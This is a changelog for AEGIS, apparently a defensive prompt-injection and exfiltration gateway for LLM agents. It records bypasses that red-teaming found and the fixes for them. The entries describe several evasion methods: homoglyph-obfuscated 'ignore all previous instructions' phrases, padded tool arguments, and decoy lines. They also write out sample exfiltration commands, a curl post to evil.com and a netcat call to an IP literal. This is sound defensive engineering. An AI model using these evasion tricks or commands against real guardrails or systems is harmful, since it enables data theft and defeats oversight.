# Changelog

All notable changes to this project are documented here. The format is based on
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project
adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.3.1] — 2026-07

### Fixed
- **CI failed on Python 3.10** at the "verify shipped model loads" step. pip
  resolves scikit-learn 1.7.x there (newer releases dropped 3.10), but the
  artifact was pickled by 1.9.0, so the version-mismatch guard correctly rejected
  it. The guard was right — the *format* was wrong.
- **A false positive introduced by the ineffective-scrub rule.** Blocking any
  sanitize-band content the scrubber couldn't clean also rejected ordinary
  business prose scoring diffusely (0.36) with no injected line to remove. The
  rule now keys on the **deterministic rule score**, not the fused score: a
  high-precision rule still firing after scrubbing means a named attack pattern
  is demonstrably present and unremovable (block); diffuse model suspicion with
  nothing to redact is routed by risk, not blocked. `SanitizeResult.rule_score`
  exposes this distinction to callers.
- The playground's startup banner crashed on a default Windows cp1252 console
  (a `→` in a `print`) — the same class of bug previously fixed in the harness,
  now guarded by a test.

### Changed
- **The model artifact is a plain `.npz`, not a pickled estimator.** The model is
  a logistic regression, so only its weights are stored. This makes it portable
  across scikit-learn/numpy versions (the CI fix) and, more importantly, means
  loading **cannot execute code** — `np.load(..., allow_pickle=False)` removes the
  RCE sink that SECURITY.md previously had to warn about. Inference is now a dot
  product plus a sigmoid; scikit-learn is a training-only dependency and `joblib`
  is dropped entirely. Integrity manifest, dimension validation and fail-closed
  behaviour are unchanged, plus new format-version and malformed-file checks.

### Added
- **`aegis-demo` — a black-and-white browser playground** (`python -m aegis.demo`).
  Submit an agent step, see the real verdict, tier, scores, reasoning and scrubbed
  content. Nine one-click scenarios reproduce the README's claims, deep-linkable
  via `/?s=<id>`. Stdlib-only, loopback by default. Every verdict comes from a
  live `AegisGateway` — no precomputed results, no detection logic in JavaScript —
  and `tests/test_demo_server.py` asserts each scenario still behaves as labelled,
  so the demo cannot drift into misrepresenting the library.

## [0.3.0] — 2026-07

Closes four bypasses found by an adversarial red-team pass against 0.2.0 (each
was independently reproduced before being fixed, and each has a regression test),
plus operational and precision work.

### Security — bypasses closed
- **Tool-call arguments are now inspected.** Only `content` was scored, so a full
  jailbreak placed in `db_query`/`exec_shell`/`http_post` arguments executed at
  `inj=0.01` (`ToolCall.flat_args()` was dead code). Arguments are now scored,
  never at USER trust (the model authored them), folded into `injection_score`
  before enforcement, and length-bounded.
- **Unicode obfuscation no longer evades detection.** Cyrillic homoglyphs dropped
  "ignore all previous instructions" from 0.956 to **0.0085**; soft hyphen,
  combining diacritics and bidi controls evaded similarly. `normalize_text` now
  strips the full invisible set (zero-width, soft hyphen, bidi/isolate controls),
  folds Cyrillic/Greek/Armenian homoglyphs, and removes combining marks — with a
  provably-equivalent ASCII fast path. All variants now score 0.956–0.980.
- **Non-egress tools can no longer exfiltrate.** `exec_shell` running
  `curl -d <secret> https://evil.com` executed with `exfiltration_attempt=False`.
  The egress filter now applies a universal rule to *every* tool: a payload
  carrying a secret **and** naming an external destination is an exfiltration
  attempt. Requiring both keeps ordinary shell/DB traffic unaffected.
- **`SANITIZE` can no longer return a live injection.** The scrubber's vocabulary
  was far narrower than the detector's, so ES/FR/DE/IT/PT overrides, secrecy and
  fake "operating directive" content was flagged, "scrubbed" without change, then
  downgraded to `ALLOW` with the attack intact in `sanitized_content`. The
  scrubber now sources its patterns from the detector lexicon (cannot drift) and
  matches on a normalized view while preserving original text. Structurally, an
  **ineffective scrub now fails closed** — the old "still injected after scrub"
  recheck was dead code, since anything reaching that stage already scored below
  the block threshold.

### Security — defects found reviewing the fixes above
A second adversarial pass over these changes found six defects *in the fixes
themselves*; all were reproduced before being corrected:

- **Accented homoglyphs defeated the unicode fix.** Folding ran before combining
  marks were stripped, so `Ignόrё ӑll prёviόus instructiόns` scored 0.011 and was
  allowed. Stripping now runs first (1.000, blocked).
- **Padded tool arguments hid the injection.** The argument path truncated where
  the content path fails closed; 100k chars of benign padding dropped a payload
  to 0.14. Arguments now fail closed identically.
- **A decoy line defeated the ineffective-scrub check.** The rule keyed on "was a
  line removed", so a removable decoy paired with an unremovable injection passed.
  The check is now "is the content still flagged after scrubbing".
- **Scheme-less IP literals were invisible** to the universal exfiltration rule
  (`nc 203.0.113.9 4444`); IPv4/IPv6 literals are now extracted.
- **Dotted filenames read as destinations.** `data.csv` / `analytics.orders` were
  treated as external hosts (and the pattern could backtrack quadratically). Host
  matching is now bounded, single-quantifier-per-label, and gated on a curated
  public-suffix set.
- **`Decision.exfiltrated` was hard-coded False for non-egress tools**, so shell
  exfiltration could never appear in the ground-truth leak count — the exact
  blind spot that metric exists to expose.

### Precision
- Tightened two over-broad `_MAL_PAYLOAD` alternations that blocked legitimate
  business text ("forward every invoice…", "disable the legacy safety interlock…").
  Both now require genuinely attack-shaped objects. 0 false positives on the
  benign probe set, 0 missed guardrail attacks.
- The soft hyphen no longer counts as an obfuscation signal (it appears in
  ordinary hyphenated text); it is still stripped during normalisation, so using
  it to break a keyword gains an attacker nothing.

### Performance
- The scrubber recomputed its per-line normalisation once **per pattern**; now
  computed once per line (concurrent throughput back to ~250% over baseline).
- `_SPACED` no longer matches across newlines, making `normalize_text`
  line-independent — which is what makes the scrubber's whole-text prefilter a
  *provably* sound superset of its per-line scan rather than an empirical one.

### Added
- `Telemetry.prometheus()` (text exposition format) and `Telemetry.health()` for
  a real gateway deployment; health reports `degraded` once internal errors occur.
- `Decision.exfiltrated` — the executor's **ground truth** (did secret bytes
  actually leave). The stress test now counts leaks from this rather than the
  filter's own verdict flags, so a filter blind spot surfaces as a real leak.
- Model provenance: `SanitizationPipeline.model_source` (`loaded:<sha12>` /
  `retrained:seed=7`), reported by the harness and stored in `results.json`;
  `python -m harness.run_all --retrain` for a clean-room run.

### Changed
- Regex payload scanning hoisted out of the behavioural monitor's global lock.
- Tests are hermetic (per-test `gateway` fixture); the wall-clock latency
  assertion is now a loose median-of-batches smoke check.
- `SECURITY.md`/`README.md` state three boundaries explicitly: argument-value
  validation (path traversal/SQLi) is the tool's job; behavioural signals key on
  the caller-supplied `agent_id` so rotating IDs evades them; detection is
  lexicon-anchored. The sandbox-tier table now says exactly what AEGIS enforces
  at its own boundary versus what the simulated executor does not.

## [0.2.0] — 2026-07

First production-hardening release. This is a large hardening pass over the
initial prototype; several changes are behavioural but the core public API
(`AegisGateway`, `AgentRequest`, `ToolCall`, `Decision`, `Source`, `Verdict`,
`SandboxTier`) is unchanged.

### Added
- Typed exception hierarchy (`aegis.errors`): `AegisError`,
  `AegisValidationError`, `AegisConfigError`, `ModelIntegrityError`.
- Structured audit logging (`aegis.audit`): every `Decision` is emitted on the
  `aegis.audit` logger; optional per-gateway `audit_sink` callback and a
  JSON-lines `configure_audit_logging()` helper.
- Config loading/validation: `AegisConfig.from_file` (JSON/TOML),
  `from_env`, `from_dict`, `validate()`, and `default_config()`.
- Injectable security policy on `AegisConfig`: egress/write/secret tool sets,
  tier capabilities, known-bad destinations, secret patterns, internal domains,
  behavioural rate/TTL/agent limits, and a max-content-length DoS bound.
- `Decision.would_block` (monitor-only impact) and `Decision.error`
  (fail-closed tag).
- Model integrity: `sha256` manifest verification, scikit-learn version-mismatch
  detection, and feature-dimension validation on load; `python -m
  aegis.sanitizer.train` to regenerate the artifact deterministically.
- CI (GitHub Actions: ruff, mypy, pytest on Linux/Windows × Python 3.10–3.13,
  wheel-contents check), `py.typed`, ruff/mypy config, and governance docs
  (SECURITY, CONTRIBUTING, CODE_OF_CONDUCT).

### Changed / Fixed — security
- **Gateway is now fail-closed:** `process()` converts any internal error into a
  `BLOCK` decision instead of propagating.
- **Egress filter** now checks *every* destination (multi-recipient/CC) and scans
  *all* arguments, and normalises + best-effort-decodes (base64/hex) payloads
  before matching, closing multi-recipient and encoded-secret bypasses.
- **Sandbox tiers are enforced** for non-egress tools (`read_secret` needs secret
  access; `delete_file`/`exec_shell` need a writable fs) — previously decorative.
- **Behavioural monitor**: rate window uses a monotonic clock (forged
  `AgentRequest.ts` can't suppress it); the learned baseline is trained only on
  allowed calls (a blocked attack can't teach it); recent blocks are
  time-windowed; the per-agent store is bounded + TTL-evicted (DoS bound).
- **Hidden-character detection fixed**: zero-width/obfuscation features are
  measured before normalisation (previously dead code). Model retrained.
- **Injection model no longer auto-writes** to the source tree on load failure;
  it retrains in memory and logs a warning.

### Changed / Fixed — correctness
- Each gateway owns a private config copy (no shared-mutable `DEFAULT_CONFIG`).
- Request/tool validation at the trust boundary with typed errors (coerces
  `str`→`Source`, rejects malformed input) and process-unique request IDs.
- Enforcer honours `PolicyCheck.hard_block` (soft trust-floor failures quarantine
  instead of hard-blocking); moderate injection alongside a benign tool now
  sanitizes instead of being dropped.
- Thread-safe telemetry (no unlocked defaultdict races).
- Intent scrubber fast-path is now provably equivalent to the baseline (union
  master regex) and the cache is keyed on content (no hash-collision bug).

### Packaging
- Model artifact ships inside the wheel (`aegis/data/`, declared package-data);
  `harness` is no longer installed as a top-level package; version is
  single-sourced; full metadata (classifiers, keywords, URLs, `aegis-train`
  console script).

## [0.1.0]

- Initial release: sanitizer, PEP (RBAC + trust + anomaly), sandbox routing +
  egress filter, intent scrubber, LangGraph adapter, and benchmark harness.
